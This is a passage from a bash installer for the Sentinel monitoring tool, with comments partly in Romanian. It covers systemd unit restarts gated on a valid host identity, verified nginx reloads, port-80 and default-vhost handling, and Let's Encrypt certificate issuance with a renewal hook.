# Calea unității vine ca ARGUMENT, nu ca variabilă de mediu cu valoare implicită:
# un knob de mediu într-un instalator e ceva ce cineva ajunge să pună din
# greșeală în producție, iar aici nu e nevoie de el — apelantul o scrie o dată,
# iar testul îi dă un director propriu.
start_beacon_unit() {
    local unit_file="$1"

    # The beacon is opt-in and deliberately NOT in the ordered list above. That
    # list dies on a unit that will not stay running, which is right for the
    # pipeline and wrong here: with beacon.enabled false the process says so
    # once in the journal and exits 0, leaving the unit inactive rather than
    # failed. Aborting an install over a component the operator has not turned
    # on yet would be absurd. Enable it either way, so that turning it on later
    # is one `systemctl restart`, not an archaeology session.
    if [[ ! -f "$unit_file" ]]; then
        info "sentinel-beacon.service: not in this build (${unit_file})"
        return 0
    fi
    systemctl enable sentinel-beacon.service >/dev/null 2>&1 || true

    # POARTA. Din august 2026 expeditorul refuză să trimită un semnal pe care
    # nu-l poate semna cu identitatea gazdei (sentinel/report/beacon.py), fiindcă
    # un semnal fără nume aterizează în găleata comună `default`. Deci o
    # repornire făcută peste un fișier de identitate lipsă sau stricat nu
    # „actualizează" beaconul, ci îl oprește din bătut — și martorul raportează,
    # corect din punctul lui de vedere, o alarmă critică despre un server viu.
    #
    # `ensure_instance_id` rulează necondiționat înaintea acestui pas, deci
    # fișierul LIPSĂ nu mai e cazul obișnuit. Ce rămâne, și de ce poarta merită
    # să existe: funcția aia refuză DELIBERAT să rescrie un fișier existent dar
    # nevalid (octeți NUL, scriere trunchiată, valoare pusă de mână) — avertizează
    # și iese cu 0. Fără poarta asta, exact acel caz ajungea la o repornire care
    # transformă un beacon care bate într-unul mut.
    #
    # A NU reporni e alegerea mai bună dintre două rele: procesul vechi rămâne
    # în picioare cu codul dinaintea livrării, deci martorul continuă să audă
    # ceva, iar `code:current` din autodiagnostic raportează că unitatea rulează
    # cod vechi. Tăcerea nu se raportează de nicăieri.
    local rc=0
    read_instance_id_file "${SENTINEL_CONFIG_DIR}/instance_id" || rc=$?
    if (( rc != 0 )) || [[ ! "$INSTANCE_ID_READ" =~ ^[0-9a-f]{32}$ ]]; then
        warn "NU repornesc sentinel-beacon: ${SENTINEL_CONFIG_DIR}/instance_id nu"
        warn "conține o identitate validă, iar expeditorul refuză să trimită un"
        warn "semnal pe care nu-l poate atribui acestei gazde. Repornit acum, ar"
        warn "amuți, iar martorul ar suna o alarmă critică despre un server viu."
        warn "Uită-te în fișier (od -c), șterge-l dacă nu e o identitate, apoi:"
        warn "    ./scripts/deploy.sh --host <gazdă> --user <utilizator> --force-step 27"
        warn "Până atunci procesul vechi rămâne pornit, cu codul dinaintea acestei"
        warn "livrări — autodiagnosticul îl raportează la 'code:current'."
        return 0
    fi

    # restart, not `enable --now`: on a host where the beacon is already
    # running, `--now` is a no-op and the process keeps executing the code
    # from the previous deployment. It would look enabled, report healthy,
    # and quietly never pick up a fix.
    if systemctl restart sentinel-beacon.service 2>/dev/null; then
        ok "sentinel-beacon.service enabled and restarted"
    else
        info "sentinel-beacon.service installed but not started (beacon.enabled is false)"
    fi
}

# Expeditorul de loturi. Aceeași formă ca beaconul, și separată dinadins.
#
# De ce trebuie ACTIVATĂ, nu doar copiată: pasul de mai sus instalează fiecare
# `deploy/systemd/*.service` de pe disc, deci unitatea ajunge pe gazdă oricum.
# O unitate instalată și neactivată e o componentă care nu rulează niciodată —
# iar `scripts/smoke-test.sh` enumeră unitățile TOT de pe disc, deci una care
# rămâne `inactive` fără timer și fără scutire raportează „deployment eșuat" pe
# fiecare gazdă, inclusiv pe cele unde `ship.enabled: false` e exact ce trebuie.
# Ambele capete ale problemei sunt aceeași cauză: două locuri enumeră unitățile
# și niciunul nu era generat.
start_shipper_unit() {
    local unit_file="$1"

    if [[ ! -f "$unit_file" ]]; then
        info "sentinel-shipper.service: not in this build (${unit_file})"
        return 0
    fi
    # Necondiționat, ca la beacon: cu `ship.enabled` fals procesul spune o dată
    # în jurnal și iese cu 0, deci activarea nu costă nimic, iar pornirea de mai
    # târziu e un `systemctl restart` în loc de o sesiune de arheologie.
    systemctl enable sentinel-shipper.service >/dev/null 2>&1 || true

    # ACEEAȘI POARTĂ ca la beacon, cu o miză diferită — și diferența merită
    # scrisă, fiindcă altfel poarta pare copiată din reflex.
    #
    # Un beacon mut produce o alarmă CRITICĂ falsă la martor. Un expeditor mut nu
    # produce nicio alarmă externă: `ship_once` întoarce
    # `ShipResult(False, "fără identitate de instalare")`, rândurile rămân în
    # coadă, iar singurul care spune ceva e `ship:lag` din autodiagnostic, la
    # următoarea rulare a `sentinel-selfcheck.timer`.
    #
    # Poarta există totuși, din același motiv: repornit peste o identitate
    # stricată, un expeditor care EXPEDIA devine unul care nu mai expediază, și
    # rândurile lui nu ajung la agregator cât timp nimeni nu se uită. Procesul
    # vechi, lăsat în picioare, continuă să expedieze sub identitatea pe care a
    # citit-o deja — iar `code:current` raportează că rulează cod vechi. Dintre
    # „vechi dar expediază" și „nou și tăcut", primul se vede de undeva.
    local rc=0
    read_instance_id_file "${SENTINEL_CONFIG_DIR}/instance_id" || rc=$?
    if (( rc != 0 )) || [[ ! "$INSTANCE_ID_READ" =~ ^[0-9a-f]{32}$ ]]; then
        warn "NU repornesc sentinel-shipper: ${SENTINEL_CONFIG_DIR}/instance_id nu"
        warn "conține o identitate validă, iar expeditorul refuză să trimită un lot"
        warn "pe care nu-l poate atribui acestei gazde — rândurile a două gazde"
        warn "fără identitate ar ajunge într-un singur lanț de audit, care ar arăta"
        warn "rupt în permanență fără să fie rupt ceva."
        warn "Uită-te în fișier (od -c), șterge-l dacă nu e o identitate, apoi:"
        warn "    ./scripts/deploy.sh --host <gazdă> --user <utilizator> --force-step 27"
        warn "Până atunci procesul vechi rămâne pornit, cu codul dinaintea acestei"
        warn "livrări — autodiagnosticul îl raportează la 'code:current'."
        return 0
    fi

    # restart, nu `enable --now`: pe o gazdă unde expeditorul rulează deja,
    # `--now` e operație nulă și procesul continuă să execute codul livrării
    # dinainte. Ar părea activat, ar raporta sănătos, și n-ar prelua niciodată o
    # reparație.
    if systemctl restart sentinel-shipper.service 2>/dev/null; then
        ok "sentinel-shipper.service enabled and restarted"
    else
        info "sentinel-shipper.service installed but not started (ship.enabled is false)"
    fi
}

# Fragmentele incluse de vhost-urile Sentinel.
#
# NU in /etc/nginx/conf.d/. Acel director e inclus de nginx.conf in contextul
# `http`, iar un fisier de `add_header` pus acolo se aplica FIECARUI site de pe
# gazda care nu-si defineste propriile antete. Sentinel a impus astfel un
# `Content-Security-Policy: default-src 'self'` si un HSTS cu includeSubDomains
# tuturor site-urilor operatorului - adica a stricat orice pagina care incarca
# un script de CDN sau un font extern, si a fortat HTTPS pe subdomenii pentru un
# an, memorat in browserele vizitatorilor.
#
# Un agent de monitorizare nu are voie sa schimbe comportamentul lucrurilor pe
# care le monitorizeaza. Fragmentele stau intr-un director propriu si sunt
# incluse explicit, doar in blocurile `server` ale Sentinel.
# Reincarca nginx SI verifica faptul, nu codul de iesire.
#
# `systemctl reload nginx` intoarce 0 daca a reusit sa TRIMITA semnalul, nu daca
# noua configuratie a fost aplicata. Cand masterul respinge configuratia, isi
# pastreaza procesele vechi si continua sa serveasca versiunea precedenta - cu
# un [emerg] in error.log pe care nu-l citeste nimeni.
#
# S-a intamplat pe productie. O zona `limit_req` isi schimbase cheia, iar cheia
# unei zone de memorie partajata nu se poate schimba la reload, doar la restart.
# `nginx -t` trecea, fiindca verifica sintaxa unei analize noi, nu
# compatibilitatea cu zonele deja alocate. Patru reincarcari consecutive au
# raportat succes; procesele nginx erau de trei zile vechi. Doua reparatii
# livrate in ziua aceea pareau sa nu functioneze, si erau amandoua corecte.
#
# Dovada ca reincarcarea a avut loc e aparitia unor procese noi. Nimic altceva
# nu o dovedeste.
nginx_workers() { pgrep -f 'nginx: worker process' 2>/dev/null | sort -n | tr '
' ' '; }

reload_nginx() {
    local before after new
    before="$(nginx_workers)"
    systemctl reload nginx || die "nginx reload failed"
    sleep 1
    after="$(nginx_workers)"

    new=""
    for pid in $after; do
        [[ " $before " == *" $pid "* ]] || new="${new}${pid} "
    done
    if [[ -n "$new" ]]; then
        ok "nginx reloaded (procese noi: ${new% })"
        return 0
    fi

    local why
    why="$(grep -F '[emerg]' /var/log/nginx/error.log 2>/dev/null | tail -1)"
    warn "nginx a ACCEPTAT semnalul de reincarcare dar a pastrat procesele vechi.
    Configuratia de pe disc NU e in vigoare. Motivul din error.log:
      ${why:-<nimic in /var/log/nginx/error.log>}"

    # `nginx -t` trece, deci un restart e sigur si e singura cale de aplicare.
    # Alternativa - sa mergem mai departe - inseamna ca tot ce urmeaza
    # (certificate, antete, vhost) se raporteaza reusit fara sa fie in vigoare.
    if nginx -t >/dev/null 2>&1; then
        warn "nginx -t trece, deci se reporneste. Cateva conexiuni in curs vor cadea."
        systemctl restart nginx || die "restartul nginx a esuat. INSPECTEAZA /etc/nginx ACUM."
        ok "nginx repornit; configuratia e acum in vigoare"
    else
        die "nginx -t NU trece si reincarcarea nu s-a aplicat. Nu repornesc: ar lasa
    nginx oprit, iar acum inca serveste. Repara configuratia si reporneste manual."
    fi
}

# Does anything in the EFFECTIVE nginx configuration still bind :80?
#
# `nginx -T` is the whole configuration as nginx itself assembles it, includes
# resolved. It is the only place where "is this listener active" is a fact
# rather than a guess about which file the block might be in — and guessing the
# file is exactly how the :80 neutralisation came to report success on Ubuntu
# without having edited anything.
#
# Three outcomes, and the third is why this returns a code instead of a boolean:
#
#   0  yes, something still listens on :80
#   1  no
#   2  could not tell (nginx absent, or it refused to dump its configuration)
#
# Collapsing 2 into 1 would print "port 80 released" over a host whose nginx
# will not even parse its own configuration.
nginx_listens_on_80() {
    local dump
    have nginx || return 2
    dump="$(nginx -T 2>/dev/null)" || return 2
    # `listen 80`, `listen 0.0.0.0:80`, `listen *:80`, `listen [::]:80`, with or
    # without default_server / ssl after it. The trailing [^0-9] keeps :8080 and
    # :8000 out of it.
    grep -qE '^[[:space:]]*listen[[:space:]]+(\[::\]:|[0-9.]+:|\*:)?80([^0-9]|$)' <<< "$dump"
}

SENTINEL_NGINX_SNIPPET_DIR=/etc/nginx/sentinel

install_sentinel_nginx_snippets() {
    install -d -m 0755 "$SENTINEL_NGINX_SNIPPET_DIR"
    install -m 0644 "${SCRIPT_DIR}/nginx/sentinel-security-headers.conf"         "${SENTINEL_NGINX_SNIPPET_DIR}/security-headers.conf"
    install -m 0644 "${SCRIPT_DIR}/nginx/sentinel-proxy-params.conf"         "${SENTINEL_NGINX_SNIPPET_DIR}/proxy-params.conf"

    # Versiunile vechi le lasau in conf.d, unde continua sa se aplice global.
    # Un upgrade trebuie sa le si elimine, altfel reparatia nu repara nimic pe
    # exact gazdele care au nevoie de ea.
    for stale in /etc/nginx/conf.d/sentinel-security-headers.conf                  /etc/nginx/conf.d/sentinel-proxy-params.conf; do
        if [[ -f "$stale" ]]; then
            rm -f "$stale"
            ok "removed ${stale} - it applied to every site on this host"
        fi
    done
}

# --- 33 -------------------------------------------------------------------
step_nginx() {
    # The vhost `include`s both of these. Installing the vhost without them
    # makes `nginx -t` fail with a confusing "open() failed" before certbot ever
    # gets a chance to run.
    install_sentinel_nginx_snippets

    # A placeholder certificate so the `listen … ssl` block is valid on a fresh
    # host. certbot replaces it later; without it, nginx -t fails on a missing
    # certificate and the install stops before it can obtain a real one.
    ensure_placeholder_certificate

    # -- Do not fight over :80 -------------------------------------------------
    #
    # The distribution's nginx.conf ships a server block bound to :80. If
    # something else on this host owns that port, nginx refuses to start with
    # "bind() to 0.0.0.0:80 failed" — and the failure looks like a Sentinel bug
    # rather than a port conflict.
    #
    # Sentinel does not need :80 at all: it serves on its own port and does not
    # redirect. So the listener is neutralised — but ONLY if we installed nginx
    # ourselves. If nginx was already here serving the operator's sites, its
    # config is theirs and editing it would be exactly the collateral damage the
    # rest of this installer works to avoid.
    #
    # NGINX_WAS_PREEXISTING is the whole distinction, and it is recorded at step
    # 20, before the package install. It is also what settles the question the
    # previous writer left open — whether sites-enabled/default is ours to
    # remove. It is, on exactly the hosts where we are the ones who put it there.
    if ! port_free 80 && [[ "${NGINX_WAS_PREEXISTING:-0}" != "1" ]]; then
        local owner80 default_site undo
        owner80="$(port_owner 80)"
        default_site="$(nginx_default_site)"
        info "port 80 is held by ${owner80:-another service}; taking nginx's own :80 listener out of service"

        cp -a /etc/nginx/nginx.conf "${SNAPSHOT_DIR}/nginx.conf.orig" 2>/dev/null || true
        if [[ "$default_site" != /etc/nginx/nginx.conf ]]; then
            # -L: the debian default site is a symlink, and a copy of the link
            # is not a copy of what it pointed at.
            cp -aL "$default_site" "${SNAPSHOT_DIR}/nginx-default-site.orig" 2>/dev/null || true
        fi

        if undo="$(nginx_disable_default_listener)"; then
            info "$undo"
        else
            info "${default_site} is not present, so there was nothing to disable there"
        fi

        # The EFFECT, not the edit. The previous version ran a sed against a
        # file that on Ubuntu carries no active `listen 80` at all, matched
        # nothing, exited 0, and printed ":80 listener commented out" — while
        # the real block sat in sites-enabled/default saying
        # `listen 80 default_server;`.
        local port80_state=0
        nginx_listens_on_80 || port80_state=$?
        case $port80_state in
            0) warn "nginx STILL has an active :80 listener after disabling \
${default_site}. It will fail to bind while ${owner80:-the other service} holds \
the port. Find the block with:
    nginx -T | grep -nE 'listen[[:space:]]+([0-9.]+:|\\*:|\\[::\\]:)?80([^0-9]|\$)'" ;;
            1) ok "no :80 listener left in nginx's effective configuration" ;;
            2) warn "nginx would not dump its effective configuration, so whether \
:80 was released is UNKNOWN — not 'fine'. Check by hand: nginx -T" ;;
        esac
    elif ! port_free 80; then
        warn "port 80 is in use and nginx was already installed here. Not touching \
nginx.conf — it is yours. If nginx fails to start, a server block in it is \
competing for :80."
    fi

    local conf=/etc/nginx/conf.d/sentinel.conf
    sed -e "s|@@DOMAIN@@|${DOMAIN:-_}|g" \
        -e "s|@@PORT@@|8787|g" \
        -e "s|@@PUBLIC_PORT@@|${PUBLIC_PORT}|g" \
        -e "s|@@TLS_DIR@@|$(tls_dir)|g" \
        "${SCRIPT_DIR}/nginx/sentinel.conf.tmpl" > "$conf"

    # Catch-all deny for requests that reach Sentinel's port without naming its
    # vhost. Without it, nginx makes Sentinel's the default for that port and it
    # answers for ANY Host — so a bare-IP scan returns the login page,
    # advertising both that a security dashboard exists here and where to aim a
    # credential attack.
    #
    # Scoped to Sentinel's port only, so it cannot collide with a default_server
    # someone else declared on 80 or 443.
    local deny_conf=/etc/nginx/conf.d/sentinel-default-deny.conf
    local existing_default
    existing_default="$(grep -rlE "listen[[:space:]]+(\[::\]:)?${PUBLIC_PORT}[^;]*default_server" \
        /etc/nginx/ 2>/dev/null | grep -v 'sentinel-default-deny' || true)"

    if [[ -z "$existing_default" ]]; then
        sed -e "s|@@PUBLIC_PORT@@|${PUBLIC_PORT}|g" \
            -e "s|@@TLS_DIR@@|$(tls_dir)|g" \
            "${SCRIPT_DIR}/nginx/sentinel-default-deny.conf.tmpl" > "$deny_conf"
        chmod 0644 "$deny_conf"
        ok "catch-all deny on :${PUBLIC_PORT} — only https://${DOMAIN:-<domain>}:${PUBLIC_PORT} reaches the dashboard"
    else
        rm -f "$deny_conf"
        warn "another vhost already declares default_server on :${PUBLIC_PORT}:"
        printf '        %s\n' $existing_default >&2
        warn "Skipped Sentinel's catch-all to avoid breaking it. Verify by hand that"
        warn "https://<this-ip>:${PUBLIC_PORT}/ does NOT return the Sentinel login page."
    fi

    # SELinux blocks nginx from proxying to 127.0.0.1:8787 by default, and the
    # symptom is a 502 with nothing useful in the nginx log.
    security_module_allow_nginx_proxy

    nginx -t || die "nginx configuration is invalid; not reloading"
    systemctl enable --now nginx
    reload_nginx

    obtain_certificate
}

# ---------------------------------------------------------------------------
# Shared mode: Sentinel as a vhost on the operator's existing nginx
# ---------------------------------------------------------------------------
SENTINEL_NGINX_FILES=(
    /etc/nginx/conf.d/sentinel-shared.conf
    /etc/nginx/sentinel/security-headers.conf
    /etc/nginx/sentinel/proxy-params.conf
    # Locul vechi, pastrat in lista ca dezinstalarea sa curete si
    # gazdele instalate inainte de mutare.
    /etc/nginx/conf.d/sentinel-security-headers.conf
    /etc/nginx/conf.d/sentinel-proxy-params.conf
)

remove_sentinel_nginx_files() {
    rm -f "${SENTINEL_NGINX_FILES[@]}" /etc/nginx/conf.d/sentinel.conf \
          /etc/nginx/conf.d/sentinel-default-deny.conf
}

step_nginx_shared() {
    # -- Refuse to proceed unless nginx really owns those ports ---------------
    #
    # Shared mode only makes sense if nginx is what is listening. If Apache or a
    # container owns 443, adding an nginx vhost achieves nothing and nginx would
    # then fail to bind.
    local owner443 owner80
    owner443="$(port_owner 443)"
    owner80="$(port_owner 80)"

    if ! grep -qi nginx <<< "${owner443}${owner80}"; then
        die "--nginx-mode shared requires nginx to own ports 80/443, but they are held \
by: 80=${owner80:-nothing} 443=${owner443:-nothing}. Use the default dedicated mode \
(--nginx-mode dedicated --web-port 8443) instead."
    fi
    ok "nginx owns 80/443 — Sentinel will be added as a vhost"

    # -- The config must be healthy BEFORE we touch it -----------------------
    #
    # If `nginx -t` already fails, adding our file makes us the prime suspect for
    # a break we did not cause, and we would have no clean state to return to.
    if ! nginx -t 2>/dev/null; then
        nginx -t || true
        die "nginx -t already fails BEFORE Sentinel touched anything. Fix the existing \
configuration first — Sentinel will not add a vhost to a broken nginx."
    fi
    ok "nginx -t passes before any change"

    install_sentinel_nginx_snippets

    ensure_placeholder_certificate

    sed -e "s|@@DOMAIN@@|${DOMAIN}|g" \
        -e "s|@@PORT@@|8787|g" \
        -e "s|@@TLS_DIR@@|$(tls_dir)|g" \
        "${SCRIPT_DIR}/nginx/sentinel-shared.conf.tmpl" \
        > /etc/nginx/conf.d/sentinel-shared.conf
    chmod 0644 /etc/nginx/conf.d/sentinel-shared.conf

    security_module_allow_nginx_proxy

    # -- And healthy AFTER. This is the important one. ----------------------
    #
    # A broken file here breaks `nginx -t` for the WHOLE server. A reload would
    # just be refused, so the operator's sites keep serving — but the next
    # restart, for any unrelated reason, would fail to start nginx at all. That
    # is a latent outage with our name on it, so a config that does not validate
    # is not allowed to stay on disk.
    if ! nginx -t 2>/dev/null; then
        nginx -t || true
        remove_sentinel_nginx_files
        if nginx -t 2>/dev/null; then
            die "Sentinel's vhost broke nginx -t, so it was REMOVED and nginx is valid \
again. Your sites are unaffected. Report the nginx -t output above."
        fi
        die "Sentinel's vhost broke nginx -t and removing it did not restore validity. \
INSPECT /etc/nginx NOW — do not restart nginx until nginx -t passes."
    fi
    ok "nginx -t passes with Sentinel's vhost added"

    reload_nginx
    ok "nginx reloaded"

    obtain_certificate

    # -- Did we accidentally become the default vhost? ----------------------
    #
    # If no vhost on this host declares `default_server`, nginx uses the first one
    # it loaded — which depends on filename order in conf.d and could be ours.
    # Then a bare-IP request would return the Sentinel login page, advertising
    # that a security dashboard lives here.
    #
    # Tested rather than assumed, and reported rather than fixed: claiming
    # `default_server` ourselves, or editing the operator's vhost to claim it,
    # would change how their sites answer an unknown Host.
    local unknown_host
    unknown_host="$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' \
        -H 'Host: sentinel-default-probe.invalid' "https://127.0.0.1/" 2>/dev/null || echo 000)"
    local probe_body
    probe_body="$(curl -sk --max-time 8 -H 'Host: sentinel-default-probe.invalid' \
        "https://127.0.0.1/login" 2>/dev/null | head -c 2000 || true)"

    if grep -qi 'sentinel' <<< "$probe_body"; then
        warn "A request with an UNKNOWN Host header returns Sentinel's dashboard \
(HTTP ${unknown_host}). That means no vhost on this host declares default_server, so \
nginx picked Sentinel's. A bare-IP scan would find the login page."
        warn "Fix it in YOUR vhost — add default_server to its listen directives:"
        warn "    listen 443 ssl default_server;"
        warn "Sentinel will not do this for you: it would change which of your sites"
        warn "answers an unknown Host, and that is your decision."
    else
        ok "an unknown Host does not reach Sentinel (HTTP ${unknown_host})"
    fi
}

ensure_placeholder_certificate() {
    # /etc/pki is an RPM convention; Debian and Ubuntu keep this under /etc/ssl
    # and have no /etc/pki at all. See tls_dir in lib/distro.sh.
    local dir; dir="$(tls_dir)"
    local cert="${dir}/certs/sentinel-selfsigned.crt"
    local key="${dir}/private/sentinel-selfsigned.key"
    [[ -f "$cert" ]] && return 0

    # Created only when absent. Debian ships /etc/ssl/private as 0710
    # root:ssl-cert, and an `install -d -m` over an existing directory would
    # change a mode that is not ours to change.
    [[ -d "${dir}/certs" ]]   || install -d -m 0755 "${dir}/certs"
    [[ -d "${dir}/private" ]] || install -d -m 0700 "${dir}/private"

    openssl req -x509 -nodes -newkey rsa:2048 -days 365 \
        -keyout "$key" -out "$cert" \
        -subj "/CN=${DOMAIN:-$(hostname -f)}" >/dev/null 2>&1 \
        || die "could not generate the placeholder certificate"
    chmod 0600 "$key"
    ok "placeholder self-signed certificate generated"
}

# ---------------------------------------------------------------------------
# TLS certificate, without owning port 80
# ---------------------------------------------------------------------------
# `certbot --nginx` is unavailable: it needs the HTTP-01 challenge on :80, and
# something else on this host owns that. TLS-ALPN-01 is out for the same reason
# (it needs :443). So the options are a webroot served by whatever DOES own :80,
# or a DNS-01 challenge.
#
# ACME_WEBROOT is the directory certbot writes the challenge token into. For this
# to work, the service on :80 must serve
#   http://<domain>/.well-known/acme-challenge/  →  ${ACME_WEBROOT}/.well-known/acme-challenge/
ACME_WEBROOT=/var/lib/letsencrypt

acme_challenge_reachable() {
    # Actually test it rather than hoping. Write a token, fetch it over plain
    # HTTP from outside, remove it. Certbot would otherwise fail after an
    # authorisation attempt, which counts against Let's Encrypt's rate limits and
    # triggers this installer's rollback for something recoverable.
    #
    # Retried, because this runs immediately after `systemctl reload nginx`: a
    # reload is graceful and asynchronous, so for a brief moment the old workers
    # may still be answering without the new :80 ACME location. A single probe
    # that lands in that window is a FALSE negative — and a false negative here
    # skips certbot entirely and leaves a self-signed certificate on a working
    # dashboard, which is exactly what happened on the first real deploy. A few
    # short retries cost nothing and remove the race.
    local token_dir="${ACME_WEBROOT}/.well-known/acme-challenge"
    local token="sentinel-probe-$(date +%s)"

    mkdir -p "$token_dir"
    printf 'sentinel-acme-probe\n' > "${token_dir}/${token}"
    chmod 0644 "${token_dir}/${token}"

    local body="" attempt
    for attempt in 1 2 3 4 5; do
        body="$(curl -fsS --max-time 12 "http://${DOMAIN}/.well-known/acme-challenge/${token}" 2>/dev/null || true)"
        [[ "$body" == "sentinel-acme-probe" ]] && break
        sleep 2
    done
    rm -f "${token_dir}/${token}"

    [[ "$body" == "sentinel-acme-probe" ]]
}

print_webroot_instructions() {
    # In shared mode Sentinel serves the challenge itself, so a failure here is
    # not about someone else's config — it is DNS, the firewall, or nginx.
    if [[ "$NGINX_MODE" == "shared" ]]; then
        cat >&2 <<EOF

  ── De ce a eșuat, în mod shared ─────────────────────────────────────────────

  În modul shared, Sentinel servește singur provocarea ACME din propriul bloc
  :80 pentru ${DOMAIN}. Dacă nu a funcționat, cauza NU este configurația altui
  serviciu. Verifică, în ordine:

    1. DNS:      dig +short ${DOMAIN}      → trebuie să dea IP-ul acestui server
    2. Firewall: portul 80 accesibil din internet (security group la provider)
    3. Vhost:    nginx -T | grep -A5 'server_name ${DOMAIN}'
    4. Manual:   curl -v http://${DOMAIN}/.well-known/acme-challenge/test

  Apoi reia doar pasul de certificat:

      sudo ${SCRIPT_DIR}/install.sh --domain ${DOMAIN} \\
          --nginx-mode shared --cert-mode webroot --from-step 33

EOF
        return 0
    fi

    cat >&2 <<EOF

  ── Cum obții un certificat real ─────────────────────────────────────────────

  Sentinel nu deține portul 80, deci provocarea HTTP-01 trebuie servită de
  serviciul care îl deține. Adaugă în configurația ACELUI serviciu:

  nginx:
      location ^~ /.well-known/acme-challenge/ {
          root ${ACME_WEBROOT};
          default_type "text/plain";
          allow all;
      }

  Apache:
      Alias /.well-known/acme-challenge/ ${ACME_WEBROOT}/.well-known/acme-challenge/
      <Directory "${ACME_WEBROOT}/.well-known/acme-challenge/">
          Require all granted
      </Directory>

  Caddy:
      handle /.well-known/acme-challenge/* {
          root * ${ACME_WEBROOT}
          file_server
      }

  Apoi reîncarcă acel serviciu și rulează:

      sudo ${SCRIPT_DIR}/install.sh --domain ${DOMAIN} \\
          --web-port ${PUBLIC_PORT} --cert-mode webroot --from-step 33

  ── Alternativ: mod shared, dacă :80 e ținut de nginx ────────────────────────

  Dacă nginx e cel care deține 80/443, Sentinel poate deveni un vhost pe el în
  loc de un port separat. Atunci servește singur provocarea ACME și certificatul
  se emite fără să atingi nimic:

      sudo ${SCRIPT_DIR}/install.sh --domain ${DOMAIN} --nginx-mode shared

  ── Alternativ: DNS-01, fără să atingi serviciul de pe :80 ───────────────────

  Nu are nevoie de niciun port. Instalează plugin-ul DNS al registrarului tău
  (ex. python3-certbot-dns-cloudflare), pune credențialele, apoi:

      sudo certbot certonly --dns-<provider> -d ${DOMAIN} \\
          --agree-tos -m ${ADMIN_EMAIL:-admin@${DOMAIN}} --non-interactive
      sudo ${SCRIPT_DIR}/install.sh --domain ${DOMAIN} \\
          --web-port ${PUBLIC_PORT} --cert-mode none --from-step 33

EOF
}

sentinel_vhost_file() {
    # Which file holds Sentinel's vhost depends on the mode. Getting this wrong
    # means editing a file that does not exist, and silently keeping the
    # self-signed certificate after a successful issuance.
    if [[ "$NGINX_MODE" == "shared" ]]; then
        printf '/etc/nginx/conf.d/sentinel-shared.conf'
    else
        printf '/etc/nginx/conf.d/sentinel.conf'
    fi
}

link_certificate() {
    # Point the vhost at the issued certificate. certbot --nginx would normally
    # rewrite the file itself, but it is not driving nginx here — and in shared
    # mode letting it edit a config directory full of the operator's own vhosts
    # would be exactly the kind of reach this installer avoids.
    local live="/etc/letsencrypt/live/${DOMAIN}"
    local vhost; vhost="$(sentinel_vhost_file)"
    [[ -f "${live}/fullchain.pem" ]] || return 1
    [[ -f "$vhost" ]] || { warn "vhost file ${vhost} not found"; return 1; }

    # Only the first occurrence pair, and only in Sentinel's own file: in shared
    # mode a global sed across conf.d would rewrite the operator's certificates.
    sed -i \
        -e "s|ssl_certificate .*|ssl_certificate     ${live}/fullchain.pem;|" \
        -e "s|ssl_certificate_key .*|ssl_certificate_key ${live}/privkey.pem;|" \
        "$vhost"

    # The catch-all keeps the self-signed placeholder on purpose: a client
    # reaching it did not name the vhost, and presenting the real certificate
    # would confirm which domain lives on this address.

    nginx -t || { warn "nginx -t failed after pointing at the certificate"; return 1; }
    reload_nginx
    return 0
}

obtain_certificate() {
    if [[ -z "$DOMAIN" ]]; then
        warn "no domain: serving with a self-signed certificate on :${PUBLIC_PORT}. \
Every browser visit warns, and you will train yourself to click through TLS \
warnings — exactly the habit an attacker relies on."
        return 0
    fi

    if [[ "$CERT_MODE" == "selfsigned" ]]; then
        warn "--cert-mode selfsigned: keeping the placeholder certificate"
        return 0
    fi

    # Already issued — link and move on. Also the path for --cert-mode none,
    # where the operator ran certbot themselves.
    if [[ -f "/etc/letsencrypt/live/${DOMAIN}/fullchain.pem" ]]; then
        if link_certificate; then
            ok "certificate for ${DOMAIN} in place"
            install_renewal_hook
            return 0
        fi
        warn "a certificate exists for ${DOMAIN} but could not be linked"
        return 0
    fi

    if [[ "$CERT_MODE" == "none" ]]; then
        warn "--cert-mode none and no certificate at /etc/letsencrypt/live/${DOMAIN}"
        print_webroot_instructions
        return 0
    fi

    local email="${ADMIN_EMAIL:-admin@${DOMAIN}}"
    mkdir -p "${ACME_WEBROOT}/.well-known/acme-challenge"

    case "$CERT_MODE" in
        dns)
            warn "--cert-mode dns: this installer does not guess your DNS provider."
            print_webroot_instructions
            return 0
            ;;
        webroot|auto)
            if [[ "$CERT_MODE" == "auto" ]]; then
                info "testing whether the service on :80 can serve an ACME challenge"
                if ! acme_challenge_reachable; then
                    warn "http://${DOMAIN}/.well-known/acme-challenge/ is not served \
from ${ACME_WEBROOT}, so certbot cannot prove domain control."
                    warn "Keeping the self-signed certificate — the dashboard works, \
but browsers will warn."
                    print_webroot_instructions
                    return 0
                fi
                ok "ACME challenge path is reachable"
            fi

            # certonly, not --nginx: certbot must not rewrite a vhost it does not
            # manage, and must not try to bind a port it cannot have.
            if certbot certonly --webroot -w "$ACME_WEBROOT" -d "$DOMAIN" \
                    --agree-tos -m "$email" --non-interactive --keep-until-expiring; then
                link_certificate && ok "Let's Encrypt certificate issued for ${DOMAIN}"
                install_renewal_hook
            else
                # Not fatal. A failed certificate is a browser warning; failing the
                # install here would roll back a working dashboard over something
                # fixable in five minutes.
                warn "certbot failed. The dashboard still works on the self-signed \
certificate; fix the challenge path and re-run with --cert-mode webroot --from-step 33."
                print_webroot_instructions
            fi
            ;;
        *)
            die "unknown --cert-mode: ${CERT_MODE} (auto|webroot|dns|selfsigned|none)"
            ;;
    esac
}

install_renewal_hook() {
    # Reload rather than restart: no dropped connections, and nothing else on the
    # host is disturbed. A renewal that silently fails to reload is the classic
    # cause of "the dashboard broke exactly 90 days after we deployed it".
    install -D -m 0755 /dev/stdin \
        /etc/letsencrypt/renewal-hooks/deploy/sentinel-reload-nginx.sh <<'EOF'
#!/bin/sh
# Installed by Sentinel. Reloads nginx after a certificate renewal.
systemctl reload nginx 2>/dev/null || true
EOF
    ok "renewal hook installed"
}

# --- 34 -------------------------------------------------------------------
step_admin_user() {
    if "${SENTINEL_PREFIX}/bin/sentinel" web --create-admin 2>/dev/null; then
        ok "admin user created; the TOTP enrolment QR was printed above — it is shown once"
    else
        info "admin user creation arrives with the web service (P1). Run afterwards:"
        info "    sentinel web --create-admin"
    fi
}

# --- 35 -------------------------------------------------------------------
# The three files step 35 has to look at by name. Constants, so the
# verification below reads exactly the config the daemon was given and
# exactly the logs the daemon writes, rather than a second guess at any name.
SURICATA_YAML=/etc/suricata/suricata.yaml
SURICATA_EVE=/var/log/suricata/eve.json
